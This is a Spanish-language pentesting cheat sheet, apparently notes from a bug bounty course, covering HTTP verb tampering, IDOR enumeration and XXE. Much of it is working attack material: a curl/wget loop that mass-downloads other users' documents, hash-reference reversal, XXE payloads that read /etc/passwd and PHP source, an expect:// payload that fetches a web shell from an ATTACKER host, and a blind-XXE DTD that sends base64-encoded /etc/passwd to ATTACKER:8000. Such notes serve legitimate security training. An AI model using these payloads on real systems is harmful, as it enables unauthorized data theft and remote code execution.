---
title: Web Attacks — HTTP Verb Tampering, IDOR, XXE
slug: web-attacks-idor-xxe
category: techniques
updated: 2026-08-20
summary: "Verb tampering (HEAD/OPTIONS salta basic-auth), IDOR (mass enum vía uid, revertir refs md5(base64) desde JS front-end), XXE (SYSTEM file://, php://filter source, expect RCE, OOB blind exfil)"
tags: [web, verb-tampering, idor, xxe, oob-exfiltration, information-disclosure, rce]
sensitive: false
---

# Web Attacks — Verb Tampering, IDOR, XXE

## When to use
Tres bugs de acceso/parsing muy comunes. Hub: [[web-app-attacks]].

## HTTP Verb Tampering
Auth/filtros aplicados solo a ciertos métodos → usar otro verbo salta el control.
```bash
curl -i -X OPTIONS http://T/        # Allow: POST,OPTIONS,HEAD,GET
# Reset restringido por basic-auth en GET/POST → HEAD lo dispara sin credenciales (sin body pero se ejecuta)
```
En Burp: `Change Request Method`. `HEAD` = GET sin body → ejecuta la acción, salta el 401. Config-based (basic auth) lo detectan scanners; el code-based (filtros de seguridad por verbo) hay que probarlo a mano.

## IDOR (Insecure Direct Object Reference)
Parámetro (`uid`, `id`, filename) que referencia un objeto sin check de authz backend → cambiarlo accede a datos ajenos.
```bash
# Parámetro directo: documents.php?uid=1 → probar uid=2,3... (vigilar SIZE/source, no solo la vista)
# Mass enum:
for i in {1..10}; do for l in $(curl -s "http://T/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do wget -q "http://T/$l"; done; done
```
**Referencias codificadas/hasheadas**: si el ref es un hash (`contract=cdd96d3c...`), intentar reproducirlo hasheando uid/username/filename. Clave: la función suele estar en el **JS del front-end**:
```javascript
// downloadContract('1') → CryptoJS.MD5(btoa(uid))  = md5(base64(uid))
```
```bash
echo -n 1 | base64 -w 0 | md5sum | tr -d ' -'   # cdd96d3cc73d1dbdaffa03cc6cd7339b → reproducido → enumerar todos
```
IDOR también en APIs (ver [[api-attacks]] BOLA) y encadenable (leer datos de otro → tomar su cuenta).

## XXE (XML External Entity)
App que parsea XML con input de usuario sin sanitizar. Confirmar definiendo una entidad interna:
```xml
<!DOCTYPE email [ <!ENTITY company "Inlane Freight"> ]>
<email>&company;</email>     <!-- si refleja "Inlane Freight" en vez de &company; → vulnerable -->
```
Truco: aunque la app use JSON, cambiar `Content-Type: application/xml` + convertir a XML puede revelar XXE.

### Leer archivos / source
```xml
<!DOCTYPE email [ <!ENTITY company SYSTEM "file:///etc/passwd"> ]>          <!-- LFI -->
<!DOCTYPE email [ <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>  <!-- source (PHP) -->
```
`file://` rompe con archivos que tengan `< > &` o binarios → usar `php://filter` base64. Java: apuntar a un directorio lista su contenido.

### RCE (si módulo expect de PHP habilitado)
```xml
<!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'http://ATTACKER/shell.php'">
<!-- $IFS por espacios; evitar | > { que rompen el XML. Luego interactuar con shell.php subida -->
```
expect raramente está habilitado → XXE se usa sobre todo para file/source disclosure + SSRF ([[server-side-attacks]]).

### Blind XXE — OOB exfiltration
Sin salida ni errores → sacar el dato vía request a tu server. `xxe.dtd` en tu host:
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://ATTACKER:8000/?content=%file;'>">
```
Payload en la request: `<!DOCTYPE email [ <!ENTITY % remote SYSTEM "http://ATTACKER:8000/xxe.dtd"> %remote; %oob; ]> <root>&content;</root>`. Listener PHP decodifica `$_GET['content']`. Automatizable con **XXEinjector** (`--oob=http --phpfilter`). Variante DNS-OOB: dato como subdominio + tcpdump.

## ⚠ DoS por billion-laughs — CONOCIMIENTO, NO EJECUTAR
El payload de entidades autorreferenciadas (`a0→a1→...→a10`) agota memoria = DoS. **Prohibido outright** (ver [[scope]]). Además servers modernos (Apache) ya protegen. Reportar como hallazgo, nunca dispararlo.

## Gotchas
- IDOR: la vista puede lucir igual con otro id — comparar SIZE/source, no confiar en la UI.
- XXE OOB necesita egress del target hacia tu host — en Full VPN el listener va en la máquina del operador.

## References
- Relacionado: [[web-app-attacks]], [[api-attacks]], [[file-inclusion]], [[server-side-attacks]]
- XXEinjector. Curso CWES Bug Bounty → 03-WEB → "Web Attacks" (HTB Academy). Notion.
